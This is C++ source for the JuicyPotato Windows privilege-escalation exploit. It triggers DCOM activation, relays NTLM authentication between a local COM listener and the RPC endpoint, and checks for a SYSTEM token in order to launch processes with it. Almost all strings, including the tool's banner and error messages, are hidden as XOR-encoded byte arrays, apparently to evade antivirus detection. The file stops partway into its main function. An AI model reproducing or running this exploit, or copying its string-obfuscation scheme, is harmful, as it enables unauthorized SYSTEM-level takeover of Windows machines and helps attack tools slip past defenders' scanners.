#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <userenv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <winsafer.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
char dcom_port[12];
char dcom_ip[17];

static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;

int IsTokenSystem(HANDLE tok)
{
	
	 char  hid__S__S__j3UGYCAIPy0Y[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
 char  k_liq1J9fjWL8G = '\x45';
for( char  &x : hid__S__S__j3UGYCAIPy0Y){
x = x ^ k_liq1J9fjWL8G;
}

	 wchar_t  hid_S_Y_S__763KZvTIL8RX[] = {'\x16','\x1c','\x16','\x11','\x0','\x8','\x45'};
 wchar_t  k_3ZKh3c6N0bXH = '\x45';
for( wchar_t  &x : hid_S_Y_S__763KZvTIL8RX){
x = x ^ k_3ZKh3c6N0bXH;
}
DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf(hid__S__S__j3UGYCAIPy0Y, olestr, DomainName, UserName);
	if (!_wcsicmp(UserName, hid_S_Y_S__763KZvTIL8RX))
		return 1;

	return 0;
}

void usage()
{
	
	 char  hid_JuicyP_tFSrHY91AOJi[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
 char  k_LiyI4pERMogi = '\x45';
for( char  &x : hid_JuicyP_tFSrHY91AOJi){
x = x ^ k_LiyI4pERMogi;
}

	 char  hid_Mandat_xL2SEwxgbf5s[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
 char  k_Vcoi6d5BmyWs = '\x45';
for( char  &x : hid_Mandat_xL2SEwxgbf5s){
x = x ^ k_Vcoi6d5BmyWs;
}

	 char  hid_Option_Muga0tMAjJmg[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
 char  k_vmLTTLcaiMMZ = '\x45';
for( char  &x : hid_Option_Muga0tMAjJmg){
x = x ^ k_vmLTTLcaiMMZ;
}
printf(hid_JuicyP_tFSrHY91AOJi, VERSION);

	printf(hid_Mandat_xL2SEwxgbf5s
	);

	printf("\n\n");
	printf(hid_Option_Muga0tMAjJmg
	);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char *bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char *bytes, int len) {
	
	 char  hid_Error__NHCPqV8XoUIw[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
 char  k_PuCOJQ5ZqH4y = '\x45';
for( char  &x : hid_Error__NHCPqV8XoUIw){
x = x ^ k_PuCOJQ5ZqH4y;
}
int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		case 1:
			//NTLM type 1 message
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 2:
			//NTLM type 2 message
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 3:
			//NTLM type 3 message
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf(hid_Error__NHCPqV8XoUIw);
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	
	 wchar_t  hid________WGIQuCDlvl3J[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x6','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
 wchar_t  k_QpqQjQ369fb0 = '\x45';
for( wchar_t  &x : hid________WGIQuCDlvl3J){
x = x ^ k_QpqQjQ369fb0;
}
CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(hid________WGIQuCDlvl3J, &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	
	 char  hid_WSASta_jaLPWCwZyBbp[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_apThNp2QOhiB = '\x45';
for( char  &x : hid_WSASta_jaLPWCwZyBbp){
x = x ^ k_apThNp2QOhiB;
}

	 char  hid________CgOefsJPL1yI[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char  k_O0eylOZm1QDc = '\x45';
for( char  &x : hid________CgOefsJPL1yI){
x = x ^ k_O0eylOZm1QDc;
}

	 char  hid_getadd_1OVD114UtJuW[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_lLOz9d2KgPqW = '\x45';
for( char  &x : hid_getadd_1OVD114UtJuW){
x = x ^ k_lLOz9d2KgPqW;
}

	 char  hid_socket_1BlcYO0khQbt[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char  k_zQsnVwrWyZ07 = '\x45';
for( char  &x : hid_socket_1BlcYO0khQbt){
x = x ^ k_zQsnVwrWyZ07;
}

	 char  hid_Unable_bmjXQWh8n26h[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
 char  k_sCv6jNP354hB = '\x45';
for( char  &x : hid_Unable_bmjXQWh8n26h){
x = x ^ k_sCv6jNP354hB;
}

	 char  hid_RPC____lej9ZwRa1MN5[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_7BZ8fOg3LfQ7 = '\x45';
for( char  &x : hid_RPC____lej9ZwRa1MN5){
x = x ^ k_7BZ8fOg3LfQ7;
}

	 char  hid_RPC____WrMYCUAie0xS[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
 char  k_0vFAcqlwstvp = '\x45';
for( char  &x : hid_RPC____WrMYCUAie0xS){
x = x ^ k_0vFAcqlwstvp;
}

	 char  hid_RPC____KwjezwwbVSnq[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_NfaurfXt3vXr = '\x45';
for( char  &x : hid_RPC____KwjezwwbVSnq){
x = x ^ k_NfaurfXt3vXr;
}
const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_jaLPWCwZyBbp, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, hid________CgOefsJPL1yI);
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf(hid_getadd_1OVD114UtJuW, iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf(hid_socket_1BlcYO0khQbt, WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf(hid_Unable_bmjXQWh8n26h);
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf(hid_RPC____lej9ZwRa1MN5, WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf(hid_RPC____WrMYCUAie0xS);
		}
		else {
			printf(hid_RPC____KwjezwwbVSnq, WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	
	 char  hid_WSASta_uItENExTGaQa[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_K5Fy5Df1adRK = '\x45';
for( char  &x : hid_WSASta_uItENExTGaQa){
x = x ^ k_K5Fy5Df1adRK;
}

	 char  hid_getadd_WLGyGAeaJYOT[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_fYIvGs6YjAIK = '\x45';
for( char  &x : hid_getadd_WLGyGAeaJYOT){
x = x ^ k_fYIvGs6YjAIK;
}

	 char  hid_socket_xNyt2V3FSaAZ[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char  k_505TbAlzsHA3 = '\x45';
for( char  &x : hid_socket_xNyt2V3FSaAZ){
x = x ^ k_505TbAlzsHA3;
}

	 char  hid_bind_f_a35vBXKFaD7d[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_xcAj8PQmBORl = '\x45';
for( char  &x : hid_bind_f_a35vBXKFaD7d){
x = x ^ k_xcAj8PQmBORl;
}

	 char  hid_listen_yzb99iOgcVC8[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_JbAUmD4kVgm9 = '\x45';
for( char  &x : hid_listen_yzb99iOgcVC8){
x = x ^ k_JbAUmD4kVgm9;
}

	 char  hid_accept_NKUFktRJLKWD[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_uWtnCTaQ7Jex = '\x45';
for( char  &x : hid_accept_NKUFktRJLKWD){
x = x ^ k_uWtnCTaQ7Jex;
}

	 char  hid_COM____uC17z9DUwU3A[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_i6sSL5PiQyV4 = '\x45';
for( char  &x : hid_COM____uC17z9DUwU3A){
x = x ^ k_i6sSL5PiQyV4;
}

	 char  hid_COM____aE5bpkRrFq3D[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_HQ1QBC7HPHLb = '\x45';
for( char  &x : hid_COM____aE5bpkRrFq3D){
x = x ^ k_HQ1QBC7HPHLb;
}

	 char  hid_shutdo_ooSGpPsME8xC[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_Pfh0EXEYPd3A = '\x45';
for( char  &x : hid_shutdo_ooSGpPsME8xC){
x = x ^ k_Pfh0EXEYPd3A;
}
const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_uItENExTGaQa, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);
	
	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf(hid_getadd_WLGyGAeaJYOT, iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf(hid_socket_xNyt2V3FSaAZ, WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_bind_f_a35vBXKFaD7d, WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf(hid_listen_yzb99iOgcVC8, WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf(hid_accept_NKUFktRJLKWD, WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			
			if (!TEST_mode)
				printf(".", iResult);
			
			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf(hid_COM____uC17z9DUwU3A, WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf(hid_COM____aE5bpkRrFq3D, WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_shutdo_ooSGpPsME8xC, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	
	 char  hid_Priv_L_m7oUjtSV1X0T[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char  k_fLh1ZtGXZ2Om = '\x45';
for( char  &x : hid_Priv_L_m7oUjtSV1X0T){
x = x ^ k_fLh1ZtGXZ2Om;
}

	 char  hid_Priv_A_IILabSygyB4V[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char  k_e9OrSLmULOU2 = '\x45';
for( char  &x : hid_Priv_A_IILabSygyB4V){
x = x ^ k_e9OrSLmULOU2;
}
TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf(hid_Priv_L_m7oUjtSV1X0T);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf(hid_Priv_A_IILabSygyB4V);
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	
	 char  hid________Jd6ry4jULGai[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char  k_BmJbwUyJUyQc = '\x45';
for( char  &x : hid________Jd6ry4jULGai){
x = x ^ k_BmJbwUyJUyQc;
}

